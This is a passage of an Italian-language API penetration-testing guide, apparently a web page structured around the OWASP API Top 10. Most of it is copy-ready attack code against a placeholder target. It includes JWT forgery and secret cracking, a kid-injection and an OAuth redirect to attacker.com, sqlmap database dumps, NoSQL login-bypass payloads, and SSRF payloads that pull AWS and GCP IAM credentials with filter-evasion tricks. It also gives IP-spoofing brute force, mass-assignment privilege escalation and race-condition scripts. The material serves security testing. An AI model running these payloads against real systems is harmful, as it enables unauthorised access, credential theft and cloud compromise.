    <p>Il testing dell'autenticazione è tra i più critici e spesso produce finding di severità Critical/High. Le API moderne usano principalmente JWT, OAuth 2.0 o API Key. Ognuno di questi meccanismi ha pattern di vulnerabilità specifici che devono essere testati sistematicamente.</p>
    <p>I JWT in particolare sono affetti da una serie di attacchi ben documentati: algorithm confusion (RS256→HS256), none algorithm, weak secret brute-force, e claim manipulation. L'implementazione corretta è complessa e gli errori sono frequentissimi anche in applicazioni enterprise.</p>
    <p><strong>OWASP API2</strong> — Broken Authentication: include credenziali deboli, token prevedibili, mancata gestione della sessione e implementazione JWT difettosa.</p>
  </div>

  <div class="test-grid">

    <!-- TEST 3.1 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">3.1 — JWT Attack Suite</span>
        <span class="test-severity sev-critical">CRITICAL</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">I JWT mal implementati sono una delle vulnerabilità più impattanti nelle API moderne. Gli attacchi principali includono: alg:none (rimozione della firma), RS256→HS256 confusion (usa la chiave pubblica come HMAC secret), weak secret brute force, e kid injection per SSRF/SQLi nel parametro kid dell'header.</div>
        <div class="tools-row">
          <span class="tool-badge">jwt_tool</span>
          <span class="tool-badge">hashcat</span>
          <span class="tool-badge">Burp JWT Editor</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>JWT_TOOL — FULL ATTACK SUITE</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Installa jwt_tool</span>
<span class="c-cmd">git</span> clone <span class="c-url">https://github.com/ticarpi/jwt_tool</span>
<span class="c-cmd">pip3</span> install <span class="c-flag">-r</span> requirements.txt <span class="c-flag">--break-system-packages</span>

<span class="c-comment"># 1. Analisi e decodifica del token</span>
<span class="c-cmd">python3</span> jwt_tool.py <span class="c-var">eyJhbGciOiJSUzI1NiJ9...</span>

<span class="c-comment"># 2. TEST: Algorithm None (rimozione firma)</span>
<span class="c-cmd">python3</span> jwt_tool.py <span class="c-var">TOKEN</span> <span class="c-flag">-X</span> a

<span class="c-comment"># 3. TEST: RS256 → HS256 confusion</span>
<span class="c-comment">#    Prima estrai la chiave pubblica</span>
<span class="c-cmd">openssl</span> s_client <span class="c-flag">-connect</span> <span class="c-var">target.com:443</span> 2>/dev/null | \
  <span class="c-cmd">openssl</span> x509 <span class="c-flag">-pubkey</span> <span class="c-flag">-noout</span> > pub.pem
<span class="c-cmd">python3</span> jwt_tool.py <span class="c-var">TOKEN</span> <span class="c-flag">-X</span> k <span class="c-flag">-pk</span> pub.pem

<span class="c-comment"># 4. Brute-force del secret HMAC</span>
<span class="c-cmd">python3</span> jwt_tool.py <span class="c-var">TOKEN</span> <span class="c-flag">-C</span> <span class="c-flag">-d</span> /usr/share/wordlists/rockyou.txt

<span class="c-comment"># Con hashcat (più veloce)</span>
<span class="c-cmd">hashcat</span> <span class="c-flag">-a</span> <span class="c-num">0</span> <span class="c-flag">-m</span> <span class="c-num">16500</span> <span class="c-var">TOKEN</span> rockyou.txt <span class="c-flag">--show</span>

<span class="c-comment"># 5. Modifica claim con secret noto</span>
<span class="c-cmd">python3</span> jwt_tool.py <span class="c-var">TOKEN</span> <span class="c-flag">-T</span> <span class="c-comment"># interactive tamper</span>
<span class="c-cmd">python3</span> jwt_tool.py <span class="c-var">TOKEN</span> <span class="c-flag">-I</span> <span class="c-flag">-pc</span> role <span class="c-flag">-pv</span> admin <span class="c-flag">-S</span> hs256 <span class="c-flag">-p</span> <span class="c-string">"secret"</span>

<span class="c-comment"># 6. Kid injection — SSRF</span>
<span class="c-cmd">python3</span> jwt_tool.py <span class="c-var">TOKEN</span> <span class="c-flag">-I</span> \
  <span class="c-flag">-hc</span> kid <span class="c-flag">-hv</span> <span class="c-string">"http://attacker.com/key"</span>

<span class="c-comment"># 7. Full scan automatico</span>
<span class="c-cmd">python3</span> jwt_tool.py <span class="c-var">TOKEN</span> <span class="c-flag">-t</span> <span class="c-url">https://target.com/api/protected</span> \
  <span class="c-flag">-rh</span> <span class="c-string">"Authorization: Bearer TOKEN"</span> \
  <span class="c-flag">-M</span> at</pre>
        </div>
      </div>
    </div>

    <!-- TEST 3.2 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">3.2 — API Key &amp; Token Security</span>
        <span class="test-severity sev-high">HIGH</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">Testing di API key: entropia insufficiente, mancata scadenza, trasporto non sicuro, esposizione nei log, mancato rate limiting per key, key condivise tra ambienti diversi. Testare anche OAuth flow per open redirect, state bypass e token leakage.</div>
        <div class="tools-row">
          <span class="tool-badge">curl</span>
          <span class="tool-badge">ffuf</span>
          <span class="tool-badge">Burp Suite</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>API KEY SECURITY CHECKS</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># 1. API key in query string (leak nei log)</span>
<span class="c-cmd">curl</span> <span class="c-string">"https://target.com/api/data?api_key=TEST_KEY"</span>

<span class="c-comment"># 2. Key nella risposta / header</span>
<span class="c-cmd">curl</span> <span class="c-flag">-v</span> <span class="c-url">https://target.com/api/token</span> <span class="c-num">2>&1</span> | \
  <span class="c-cmd">grep</span> <span class="c-flag">-iE</span> <span class="c-string">"api.key|token|secret|auth"</span>

<span class="c-comment"># 3. Brute force API key (bassa entropia)</span>
<span class="c-cmd">ffuf</span> <span class="c-flag">-u</span> <span class="c-string">"https://target.com/api/data?key=FUZZ"</span> \
  <span class="c-flag">-w</span> common_api_keys.txt \
  <span class="c-flag">-mc</span> <span class="c-num">200</span> <span class="c-flag">-fs</span> <span class="c-num">0</span>

<span class="c-comment"># 4. OAuth — check state parameter</span>
<span class="c-comment"># Inizia il flow, cattura l'authorization URL</span>
<span class="c-comment"># Rimuovi o modifica il parametro state → CSRF su OAuth</span>
<span class="c-cmd">curl</span> <span class="c-string">"https://target.com/oauth/authorize?client_id=APP&state="</span>

<span class="c-comment"># 5. OAuth open redirect</span>
<span class="c-cmd">curl</span> <span class="c-flag">-v</span> <span class="c-string">"https://target.com/oauth/authorize?\
client_id=legit&redirect_uri=https://attacker.com"</span>

<span class="c-comment"># 6. Token nell'URL → leak nei Referer header</span>
<span class="c-comment"># Controlla se i token vengono passati come query param</span>
<span class="c-cmd">grep</span> <span class="c-flag">-r</span> <span class="c-string">"access_token="</span> intercepted_traffic.txt</pre>
        </div>
      </div>
    </div>

  </div>
</section>

<!-- ════════════════════════════════ PHASE 4 ════════════════════════════════ -->
<section class="phase" id="phase4">
  <div class="phase-header">
    <div class="phase-number yellow">04</div>
    <div>
      <div class="phase-title">Authorization Testing — BOLA &amp; BFLA</div>
      <div class="phase-subtitle">idor · object level · function level · mass assignment</div>
    </div>
  </div>

  <div class="description yellow">
    <p>BOLA (Broken Object Level Authorization), alias IDOR, è al primo posto dell'OWASP API Top 10 per un motivo: è la vulnerabilità più diffusa e impattante nelle API REST. Si verifica quando un endpoint usa un ID oggetto fornito dall'utente senza verificare che l'utente abbia effettivamente il diritto di accedere a quell'oggetto.</p>
    <p>BFLA (Broken Function Level Authorization) è simile ma agisce a livello di funzione: un utente normale può invocare endpoint admin o funzioni privilegiate a cui non dovrebbe avere accesso. Il Mass Assignment avviene quando l'API bind automaticamente i parametri della richiesta all'oggetto del modello, permettendo all'attaccante di impostare proprietà non intenzionalmente esposte.</p>
    <p><strong>OWASP API1 (BOLA) + API5 (BFLA) + API3 (Mass Assignment)</strong> — Insieme coprono la maggior parte dei finding critici in un pentest API.</p>
  </div>

  <div class="test-grid">

    <!-- TEST 4.1 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">4.1 — BOLA / IDOR Testing con Autorize</span>
        <span class="test-severity sev-critical">CRITICAL</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">L'approccio più efficace per il testing BOLA è usare due account: utente A (authenticated) e utente B (con token intercettato). Con il plugin Burp Autorize, ogni richiesta di A viene automaticamente ri-inviata con il token di B, evidenziando i response identici (= BOLA). Completare con fuzzing manuale degli ID.</div>
        <div class="tools-row">
          <span class="tool-badge">Burp Autorize</span>
          <span class="tool-badge">ffuf</span>
          <span class="tool-badge">curl</span>
          <span class="tool-badge">Python script</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>BOLA TESTING — SCRIPT PYTHON</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment">#!/usr/bin/env python3</span>
<span class="c-comment"># BOLA tester — confronta risposta con token A vs token B</span>
<span class="c-kw">import</span> requests

USER_A_TOKEN = <span class="c-string">"eyJhbGc..."</span>  <span class="c-comment"># token legittimo</span>
USER_B_TOKEN = <span class="c-string">"eyJhbGc..."</span>  <span class="c-comment"># token attaccante</span>
BASE_URL     = <span class="c-string">"https://target.com/api/v1"</span>

<span class="c-comment"># ID objects da testare</span>
object_ids = range(<span class="c-num">1000</span>, <span class="c-num">1050</span>)
endpoints  = [<span class="c-string">"/users/{id}"</span>, <span class="c-string">"/orders/{id}"</span>, <span class="c-string">"/documents/{id}"</span>]

<span class="c-kw">for</span> endpoint <span class="c-kw">in</span> endpoints:
    <span class="c-kw">for</span> obj_id <span class="c-kw">in</span> object_ids:
        url = BASE_URL + endpoint.format(id=obj_id)
        r_a = requests.get(url, headers={<span class="c-string">"Authorization"</span>: f<span class="c-string">"Bearer {USER_A_TOKEN}"</span>})
        r_b = requests.get(url, headers={<span class="c-string">"Authorization"</span>: f<span class="c-string">"Bearer {USER_B_TOKEN}"</span>})
        
        <span class="c-kw">if</span> r_b.status_code == <span class="c-num">200</span> <span class="c-kw">and</span> r_b.text == r_a.text:
            <span class="c-cmd">print</span>(f<span class="c-string">"[BOLA] {url} — UserB accede a risorsa UserA!"</span>)
        <span class="c-kw">elif</span> r_b.status_code == <span class="c-num">200</span>:
            <span class="c-cmd">print</span>(f<span class="c-string">"[CHECK] {url} — status 200 con UserB, verifica manuale"</span>)</pre>
        </div>
        <div class="code-wrap" style="margin-top:12px;">
          <div class="code-label">
            <span>ID ENUMERATION — FFUF</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Genera wordlist numerica</span>
<span class="c-cmd">seq</span> <span class="c-num">1</span> <span class="c-num">10000</span> > ids.txt

<span class="c-comment"># Integer ID fuzzing</span>
<span class="c-cmd">ffuf</span> <span class="c-flag">-u</span> <span class="c-string">"https://target.com/api/v1/users/FUZZ/profile"</span> \
  <span class="c-flag">-w</span> ids.txt \
  <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer USER_B_TOKEN"</span> \
  <span class="c-flag">-mc</span> <span class="c-num">200</span> <span class="c-flag">-t</span> <span class="c-num">50</span>

<span class="c-comment"># UUID fuzzing (se i ID sono UUID)</span>
<span class="c-cmd">ffuf</span> <span class="c-flag">-u</span> <span class="c-string">"https://target.com/api/v1/docs/FUZZ"</span> \
  <span class="c-flag">-w</span> uuid_wordlist.txt \
  <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer USER_B_TOKEN"</span> \
  <span class="c-flag">-mc</span> <span class="c-num">200</span></pre>
        </div>
      </div>
    </div>

    <!-- TEST 4.2 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">4.2 — BFLA &amp; Mass Assignment</span>
        <span class="test-severity sev-critical">CRITICAL</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">BFLA: testa endpoint admin/privilegiati con un token utente normale. Prova anche path traversal sulla versione API (v1 → v2 admin endpoint). Mass Assignment: aggiungi proprietà extra al JSON body che il modello non dovrebbe accettare dall'esterno (role, is_admin, credit, subscription_tier).</div>
        <div class="tools-row">
          <span class="tool-badge">curl</span>
          <span class="tool-badge">Burp Suite</span>
          <span class="tool-badge">ffuf</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>BFLA — ADMIN ENDPOINT ACCESS</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Testa endpoint admin con token user normale</span>
<span class="c-kw">for</span> ep <span class="c-kw">in</span> /admin /admin/users /admin/config /management /internal \
          /api/admin /api/v1/admin /api/v2/admin /actuator /metrics; <span class="c-kw">do</span>
  <span class="c-cmd">echo</span> <span class="c-flag">-n</span> <span class="c-string">"[$ep] → "</span>
  <span class="c-cmd">curl</span> <span class="c-flag">-s</span> <span class="c-flag">-o</span> /dev/null <span class="c-flag">-w</span> <span class="c-string">"%{http_code}"</span> \
    <span class="c-url">https://target.com$ep</span> \
    <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer USER_TOKEN"</span>
  <span class="c-cmd">echo</span>
<span class="c-kw">done</span>

<span class="c-comment"># Eleva il proprio ruolo</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> PUT <span class="c-url">https://target.com/api/v1/users/me</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer USER_TOKEN"</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"role": "admin"}'</span></pre>
        </div>
        <div class="code-wrap" style="margin-top:12px;">
          <div class="code-label">
            <span>MASS ASSIGNMENT — PROPERTY INJECTION</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Registrazione con proprietà extra</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/v1/users/register</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{
    "username": "attacker",
    "email": "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e28396968381898790a287948b8ecc818d8f">[email&#160;protected]</a>",
    "password": "P@ssw0rd!",
    "role": "admin",
    "is_admin": true,
    "is_verified": true,
    "credit_balance": 999999,
    "subscription": "enterprise",
    "_isActive": true
  }'</span>

<span class="c-comment"># Update profilo con proprietà privilegiate</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> PATCH <span class="c-url">https://target.com/api/v1/users/me</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Authorization: Bearer USER_TOKEN"</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"is_admin": true, "role": "superuser"}'</span></pre>
        </div>
      </div>
    </div>

  </div>
</section>

<!-- ════════════════════════════════ PHASE 5 ════════════════════════════════ -->
<section class="phase" id="phase5">
  <div class="phase-header">
    <div class="phase-number purple">05</div>
    <div>
      <div class="phase-title">Input Validation &amp; Injection</div>
      <div class="phase-subtitle">sqli · nosqli · ssrf · xxe · command injection · xss in api</div>
    </div>
  </div>

  <div class="description purple">
    <p>Il testing di injection nelle API richiede un approccio diverso rispetto alle applicazioni web tradizionali. Le API REST accettano input in JSON/XML/query string, e ogni parametro è un potenziale vettore. La chiave è mappare tutti i punti di input (path params, query params, body fields, headers custom) e testare ognuno sistematicamente.</p>
    <p>SSRF (Server Side Request Forgery) è particolarmente critico negli ambienti cloud: un endpoint che accetta URL può diventare il veicolo per accedere al metadata service AWS/GCP/Azure (169.254.169.254), portando a compromissione dell'intera infrastruttura cloud con credential theft delle IAM role.</p>
    <p><strong>OWASP API7 (SSRF) + API8 (Misconfiguration)</strong> — Sono spesso concatenabili per escalation critica.</p>
  </div>

  <div class="test-grid">

    <!-- TEST 5.1 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">5.1 — SQL &amp; NoSQL Injection</span>
        <span class="test-severity sev-critical">CRITICAL</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">SQLi nelle API è spesso più facile da sfruttare che nelle applicazioni web perché il backend gestisce direttamente i dati JSON. NoSQL injection (MongoDB) con operator injection è particolarmente diffusa e spesso bypassata dai WAF perché i payload sembrano JSON legittimo.</div>
        <div class="tools-row">
          <span class="tool-badge">sqlmap</span>
          <span class="tool-badge">ffuf</span>
          <span class="tool-badge">curl</span>
          <span class="tool-badge">Burp Suite</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>SQLMAP — API ENDPOINTS</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># SQLi su GET parameter</span>
<span class="c-cmd">sqlmap</span> <span class="c-flag">-u</span> <span class="c-string">"https://target.com/api/v1/users?id=1"</span> \
  <span class="c-flag">--headers</span>=<span class="c-string">"Authorization: Bearer TOKEN"</span> \
  <span class="c-flag">--level</span>=<span class="c-num">5</span> <span class="c-flag">--risk</span>=<span class="c-num">3</span> <span class="c-flag">--batch</span>

<span class="c-comment"># SQLi su POST body JSON</span>
<span class="c-cmd">sqlmap</span> <span class="c-flag">-u</span> <span class="c-string">"https://target.com/api/v1/search"</span> \
  <span class="c-flag">--data</span>=<span class="c-string">'{"query":"test","filter":"active"}'</span> \
  <span class="c-flag">--headers</span>=<span class="c-string">"Content-Type: application/json
Authorization: Bearer TOKEN"</span> \
  <span class="c-flag">--dbms</span>=mysql \
  <span class="c-flag">--dump</span> <span class="c-flag">--batch</span>

<span class="c-comment"># Salva request da Burp e usa -r</span>
<span class="c-cmd">sqlmap</span> <span class="c-flag">-r</span> request.txt <span class="c-flag">--level</span>=<span class="c-num">5</span> <span class="c-flag">--batch</span></pre>
        </div>
        <div class="code-wrap" style="margin-top:12px;">
          <div class="code-label">
            <span>NOSQL INJECTION — MONGODB OPERATOR</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Auth bypass con $ne operator</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/v1/login</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"username":{"$ne":""},"password":{"$ne":""}}'</span>

<span class="c-comment"># Wildcard con $regex</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/v1/login</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"username":{"$regex":".*"},"password":{"$regex":".*"}}'</span>

<span class="c-comment"># $where injection (JavaScript execution)</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/v1/users/search</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"query":{"$where":"sleep(5000)"}}'</span>

<span class="c-comment"># $gt per bypass login</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/v1/login</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"username":"admin","password":{"$gt":""}}'</span></pre>
        </div>
      </div>
    </div>

    <!-- TEST 5.2 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">5.2 — Server Side Request Forgery (SSRF)</span>
        <span class="test-severity sev-critical">CRITICAL</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">SSRF negli ambienti cloud è particolarmente devastante. Se l'API elabora URL forniti dall'utente, si può puntare all'IMDS (Instance Metadata Service) per rubare le credenziali IAM e ottenere accesso all'intera infrastruttura cloud. Usare Burp Collaborator o interactsh per rilevare SSRF out-of-band.</div>
        <div class="tools-row">
          <span class="tool-badge">interactsh</span>
          <span class="tool-badge">curl</span>
          <span class="tool-badge">Burp Collaborator</span>
          <span class="tool-badge">ffuf</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>SSRF — CLOUD METADATA &amp; INTERNAL</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Setup interactsh per SSRF OOB detection</span>
<span class="c-cmd">interactsh-client</span> <span class="c-flag">-server</span> oast.pro

<span class="c-comment"># Payload SSRF su endpoint che accetta URL</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/v1/webhook</span> \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"url": "https://UNIQUE_ID.oast.pro/ssrf-test"}'</span>

<span class="c-comment"># AWS IMDS v1 — credenziali IAM</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/fetch</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'</span>

<span class="c-comment"># GCP metadata</span>
<span class="c-cmd">curl</span> <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/fetch</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"url":"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}'</span>

<span class="c-comment"># Internal services discovery</span>
<span class="c-cmd">ffuf</span> <span class="c-flag">-u</span> <span class="c-url">https://target.com/api/fetch</span> \
  <span class="c-flag">-X</span> POST \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"url":"http://10.0.0.FUZZ:8080/"}'</span> \
  <span class="c-flag">-w</span> <span class="c-string">&lt;(seq 1 255)</span> \
  <span class="c-flag">-mc</span> <span class="c-num">200</span> <span class="c-flag">-fs</span> <span class="c-num">0</span>

<span class="c-comment"># Bypass SSRF filter — URL encoding / tricks</span>
<span class="c-string">"url": "http://169.254.169.254"</span>  <span class="c-comment"># base</span>
<span class="c-string">"url": "http://169.254.169.254.nip.io"</span>
<span class="c-string">"url": "http://2852039166"</span>  <span class="c-comment"># decimal IP</span>
<span class="c-string">"url": "http://0xa9fea9fe"</span>  <span class="c-comment"># hex IP</span>
<span class="c-string">"url": "http://[::ffff:a9fe:a9fe]"</span>  <span class="c-comment"># IPv6</span></pre>
        </div>
      </div>
    </div>

  </div>
</section>

<!-- ════════════════════════════════ PHASE 6 ════════════════════════════════ -->
<section class="phase" id="phase6">
  <div class="phase-header">
    <div class="phase-number orange">06</div>
    <div>
      <div class="phase-title">Rate Limiting, DoS &amp; Business Logic</div>
      <div class="phase-subtitle">rate bypass · race conditions · logic flaws · resource exhaustion</div>
    </div>
  </div>

  <div class="description orange">
    <p>Il rate limiting è spesso implementato male o in modo bypassabile. Le tecniche più efficaci includono lo spoofing dell'IP tramite header X-Forwarded-For, la rotazione minima dell'input (spazi, maiuscole) per gli endpoint di autenticazione, e il batching di richieste per endpoint che non hanno rate limit individuale.</p>
    <p>Le <strong>race condition</strong> sono particolarmente interessanti nelle API che gestiscono transazioni, saldi, o operazioni che richiedono check-then-act atomici. Turbo Intruder in Burp consente di inviare richieste in parallelo con timing sub-millisecondo, ideale per sfruttare TOCTOU (Time-of-check-to-time-of-use).</p>
    <p>I <strong>flaw di business logic</strong> richiedono comprensione del dominio applicativo: prezzi negativi, quantità zero, workflow step skip, abuso di coupon, e manipolazione dello stato della sessione multi-step.</p>
  </div>

  <div class="test-grid">

    <!-- TEST 6.1 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">6.1 — Rate Limiting Bypass</span>
        <span class="test-severity sev-high">HIGH</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">Testa il bypass del rate limiting su endpoint critici: login brute force, OTP enumeration, password reset. Le tecniche principali sono header spoofing per IP bypass, input manipulation per bypass su unique-per-user limit, e request batching.</div>
        <div class="tools-row">
          <span class="tool-badge">ffuf</span>
          <span class="tool-badge">Turbo Intruder</span>
          <span class="tool-badge">curl</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>RATE LIMIT BYPASS TECHNIQUES</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># 1. Header IP spoofing — test ogni header</span>
<span class="c-kw">for</span> header <span class="c-kw">in</span> \
  <span class="c-string">"X-Forwarded-For"</span> \
  <span class="c-string">"X-Real-IP"</span> \
  <span class="c-string">"X-Originating-IP"</span> \
  <span class="c-string">"X-Client-IP"</span> \
  <span class="c-string">"X-Remote-IP"</span> \
  <span class="c-string">"CF-Connecting-IP"</span>; <span class="c-kw">do</span>
  <span class="c-cmd">curl</span> <span class="c-flag">-s</span> <span class="c-flag">-o</span> /dev/null <span class="c-flag">-w</span> <span class="c-string">"[$header] %{http_code}\n"</span> \
    <span class="c-flag">-X</span> POST <span class="c-url">https://target.com/api/v1/login</span> \
    <span class="c-flag">-H</span> <span class="c-string">"$header: 1.1.1.1"</span> \
    <span class="c-flag">-d</span> <span class="c-string">'{"user":"admin","pass":"wrong"}'</span>
<span class="c-kw">done</span>

<span class="c-comment"># 2. Input mutation per bypass OTP limit</span>
<span class="c-comment"># Se c'è limite per email, muta minimalmente</span>
<span class="c-cmd">cat</span> > otp_emails.txt <span class="c-string">&lt;&lt;EOF
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a8dec1cbdcc1c5e8dcc9dacfcddc86cbc7c5">[email&#160;protected]</a>
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a2d4cbc1d6cbcf8993e2d6c3d0c5c7d68cc1cdcf">[email&#160;protected]</a>
<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4e18070d1a07030e3a2f3c292b3a602d2123">[email&#160;protected]</a>
victim @target.com
 <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="72041b11061b1f320613001517065c111d1f">[email&#160;protected]</a>
v\<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1a6f2a2a5f5c796e73775a6e7b687d7f6e34797577">[email&#160;protected]</a>
EOF</span>

<span class="c-comment"># 3. ffuf brute force con IP rotation</span>
<span class="c-cmd">ffuf</span> <span class="c-flag">-u</span> <span class="c-url">https://target.com/api/v1/login</span> \
  <span class="c-flag">-X</span> POST \
  <span class="c-flag">-H</span> <span class="c-string">"Content-Type: application/json"</span> \
  <span class="c-flag">-H</span> <span class="c-string">"X-Forwarded-For: FUZZ2"</span> \
  <span class="c-flag">-d</span> <span class="c-string">'{"username":"admin","password":"FUZZ1"}'</span> \
  <span class="c-flag">-w</span> passwords.txt:FUZZ1 \
  <span class="c-flag">-w</span> ips.txt:FUZZ2 \
  <span class="c-flag">-mc</span> <span class="c-num">200</span> <span class="c-flag">-t</span> <span class="c-num">20</span></pre>
        </div>
      </div>
    </div>

    <!-- TEST 6.2 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">6.2 — Race Conditions</span>
        <span class="test-severity sev-critical">CRITICAL</span>
      </div>
      <div class="test-card-body">
        <div class="test-desc">Le race condition permettono di eseguire operazioni multiple che il sistema considera singole: riscattare un coupon 10 volte, scalare un saldo negativo, completare un acquisto con un saldo insufficiente. Turbo Intruder è il tool di riferimento per inviare richieste in parallelo con timing preciso al millisecondo.</div>
        <div class="tools-row">
          <span class="tool-badge">Turbo Intruder</span>
          <span class="tool-badge">Python asyncio</span>
        </div>
        <div class="code-wrap">
          <div class="code-label">
            <span>RACE CONDITION — PYTHON ASYNCIO</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment">#!/usr/bin/env python3</span>
<span class="c-comment"># Race condition tester — invia N richieste concorrenti</span>
<span class="c-kw">import</span> asyncio, aiohttp

TOKEN   = <span class="c-string">"Bearer YOUR_TOKEN"</span>
URL     = <span class="c-string">"https://target.com/api/v1/coupon/redeem"</span>
PAYLOAD = {<span class="c-string">"coupon_code"</span>: <span class="c-string">"DISCOUNT50"</span>}
N       = <span class="c-num">20</span>  <span class="c-comment"># richieste concorrenti</span>

<span class="c-kw">async def</span> send_request(session, i):
    <span class="c-kw">async with</span> session.post(URL, json=PAYLOAD,
      headers={<span class="c-string">"Authorization"</span>: TOKEN}) <span class="c-kw">as</span> r:
        body = <span class="c-kw">await</span> r.json()
        <span class="c-cmd">print</span>(f<span class="c-string">"[{i}] status={r.status} → {body}"</span>)

<span class="c-kw">async def</span> main():
    <span class="c-kw">async with</span> aiohttp.ClientSession() <span class="c-kw">as</span> s:
        tasks = [send_request(s, i) <span class="c-kw">for</span> i <span class="c-kw">in</span> range(N)]
        <span class="c-kw">await</span> asyncio.gather(*tasks)

asyncio.run(main())</pre>
        </div>
        <div class="code-wrap" style="margin-top:12px;">
          <div class="code-label">
            <span>TURBO INTRUDER — BURP SCRIPT (PYTHON)</span>
            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
          </div>
          <pre><span class="c-comment"># Script per Turbo Intruder (Burp Extension)</span>
<span class="c-comment"># Incolla in Extensions → Turbo Intruder → Script</span>

<span class="c-kw">def</span> queueRequests(target, wordlists):
    engine = RequestEngine(
      endpoint=target.endpoint,
      concurrentConnections=<span class="c-num">30</span>,
      requestsPerConnection=<span class="c-num">1</span>,
      pipeline=<span class="c-kw">False</span>
    )
    <span class="c-kw">for</span> i <span class="c-kw">in</span> range(<span class="c-num">30</span>):
        engine.queue(target.req, <span class="c-kw">None</span>, gate=<span class="c-string">'race'</span>)
    engine.openGate(<span class="c-string">'race'</span>)

<span class="c-kw">def</span> handleResponse(req, interesting):
    table.add(req)</pre>
        </div>
      </div>
    </div>

    <!-- TEST 6.3 -->
    <div class="test-card">
      <div class="test-card-header">
        <span class="test-name">6.3 — Business Logic Flaws</span>
        <span class="test-severity sev-high">HIGH</span>
      </div>
      <div class="test-card-body">
